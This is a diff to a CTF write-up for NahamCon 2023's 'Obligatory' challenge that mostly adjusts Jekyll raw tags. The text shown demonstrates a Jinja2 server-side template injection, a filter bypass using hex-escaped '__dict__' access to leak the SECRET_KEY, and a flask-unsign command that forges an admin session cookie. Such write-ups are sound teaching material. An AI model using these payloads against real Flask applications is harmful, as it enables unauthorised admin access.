@@ -27,18 +27,17 @@ The parameter is Vulnerable to **SSTI**
 ```
 http://challenge.nahamcon.com:31129/?success={{7*7}}
 ```
-{% raw %}
 
 I tried to leak Config items with `{{config.items()}}`, but is blocked by the filter
 
 ![](https://raw.githubusercontent.com/jmrcsnchz/NahamCon_CTF_2023_Writeups/main/Obligatory/config-waf.png)
 
-Bypassed with `{{self|attr("\x5f\x5fdict\x5f\x5f")}}`
+Bypassed with{% raw % } `{{self|attr("\x5f\x5fdict\x5f\x5f")}}` {% endraw % }
 
 ![](https://raw.githubusercontent.com/jmrcsnchz/NahamCon_CTF_2023_Writeups/main/Obligatory/waf-bypass.png)
 
 Now that we got the SECRET_KEY, we can forge our own Flask Session and login as Admin
-{% endraw %}
+
 ```bash
 flask-unsign --sign --cookie "{'id':1}" --secret "&GTHN&Ngup3WqNm6q\$5nPGSAoa7SaDuY"
 ```
